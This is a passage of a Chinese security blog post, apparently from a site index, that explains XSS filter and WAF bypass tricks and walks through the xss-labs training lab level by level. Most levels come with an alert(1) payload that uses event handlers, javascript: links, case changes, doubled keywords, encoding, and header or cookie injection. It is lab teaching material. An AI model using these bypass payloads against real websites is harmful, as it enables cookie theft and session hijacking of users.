其余标签没有很好的例子 就先不做讨论 后续找到相关案例可能会补上 编码绕过有些情况下我们可以使用html实体化编码来绕过对关键字的过滤 这个有些情况我不太理解,另外有的时候无法闭合可以使用’ 来进行闭合 self xss 到可以利用的xss存储型的xss很多情况下都可能只是self xss 我们需要对其进行扩大危害才能证明其是一个有效的漏洞 常用的思路 : 例如搜索历史,因为搜索功能往往会是get传参我们可以利用url来让其不知情的情况下进行了搜索然后触发我们的xss csrf+xss 例如修改名字才能触发的xss 我们制作csrf来让用户的名字修改为我们的xsspayload 绕waf bpass分段传入值 触发xss,利用对方的业务来拼接我们的payload 也可以利用参数来进行分段绕过waf的关键字匹配 xss-labs 通关在了解了基础的知识后可以利用该靶场来巩固加深知识 1-7关第一关: 完全-没有过滤 payload: 1&lt;script&gt;alert(1)&lt;/script&gt; 第二关: “h2”标签 进行了实体化过滤 (htmlentities函数) 但是input标签未作处理 payload: 12&quot; onfocus=alert(1) //&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt; 第三关:和上关相比 input标签进行了过滤 无法使用双引号但是可以使用单引号闭合value 12&#x27; onfocus=alert(1) //&#x27;&gt; &lt;script&gt;alert(1)&lt;/script&gt; 第四关: input标签过滤了尖括号(&lt; &gt;)但是采用事件一样可以所以上一关的第一个payload直接使用即可 1&#x27; onfocus=alert(1) // 第五关: 进行了匹配关键字过滤(on和script会过滤为o_n scr_ipt) 但是尖括号 “ 都正常 尝试使用不带事件和script的payload 伪协议 1&quot;&gt; &lt;a href=javascript:alert(1)&gt;123// 第六关: 和上关一样也进行了关键字过滤,尝试大小写 发现并没有进行大小写转换 1&quot;&gt; &lt;a Href=javascript:alert(1)&gt;123// 第七关: 对关键字进行了过滤,大小写进行了转换,但是发现对方对关键字是替换为空,尝试进行双写绕过 1&quot; oonnblur=alert(1)// 8-9 关第8关: 添加友情链接,会将你的输入添加到href属性中 尝试javascript:alert(1) 发现 script被过滤为 scr_ipt,开始尝试闭合href 使用事件但是on 也被过滤 尝试进行编码绕过 1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;pt:alert(1) 第9关: 还是添加友情连接 尝试上一关的payload发现输出您的链接不合法,怀疑是对其做了校验 尝试后发现只有 添加的数据中带有 http:&#x2F;&#x2F; 时才会正常显示 尝试编码绕过加上http:&#x2F;&#x2F; 1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;pt:alert(1) //http:// 10- 14 关第10关: 没有输入框,邮件查看源码发现隐藏的input标签,经过测试三个参数后发现只有t_sort会被输出到input标签,闭合引号构造事件 1&quot; onblur=alert(1) type=text// 第11关:同上关,发现新增的参数t_ref,尝试get请求但是没有输出,根据其意思猜测为数据请求包的ref字段,burp抓包修改ref字段为paylaod成功 1&quot; onblur=alert(1) type=text// 第12关:同上关,ua头参数 第13关:同上,cookie修改为paylaod 第14关: 代码中的网址失效 无法进行测试 15关第15关:什么也没有,但是F12阅读源码发现包含了 angular.min.js这个框架并且使用了 ng-include: 怀疑这里存在参数 fuzz 发现参数是src 并且参数值会被带入 ng-include 所以我们利用该参数包含之前关卡页面实现xss 1?src=&#x27;level1.php?name=&lt;img src=x onerror=alert(xss)&gt;&#x27; 16关只有一个输出点 尝试直接使用script标签 发现被过滤 尝试其他标签 img标签 发现正常但是空格会被过滤导致不能生效 产生 17关两个参数会被接收组合在embed标签 ,同input标签一样使用引号闭合前面 构造事件进行弹窗 1?arg01=1&amp;arg02=&quot;2 onfocus=alert(1)// 18关和上一关一摸一样 直接使用上一关的payload xss的危害12345678910111、网络钓鱼，包括盗取各类用户账号；2、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；3、劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；4、强制弹出广告页面、刷流量等；5、网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等；6、进行大量的客户端攻击，如DDoS攻击；7、获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；8、控制受害者机器向其他网站发起攻击；9、结合其他漏洞，如CSRF漏洞，实施进一步作恶；10、提升用户权限，包括进一步渗透网站；11、传播跨站脚本蠕虫等； 理论上很多但是大部分情况下也就是打个cookie,配合cors拿敏感数据和配合csrf扩大危害","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://github.io/tags/xss/"}],"author":"清海"}],"categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"src挖掘","slug":"src挖掘","permalink":"http://github.io/tags/src%E6%8C%96%E6%8E%98/"},{"name":"java安全","slug":"java安全","permalink":"http://github.io/tags/java%E5%AE%89%E5%85%A8/"},{"name":"xss","slug":"xss","permalink":"http://github.io/tags/xss/"}]}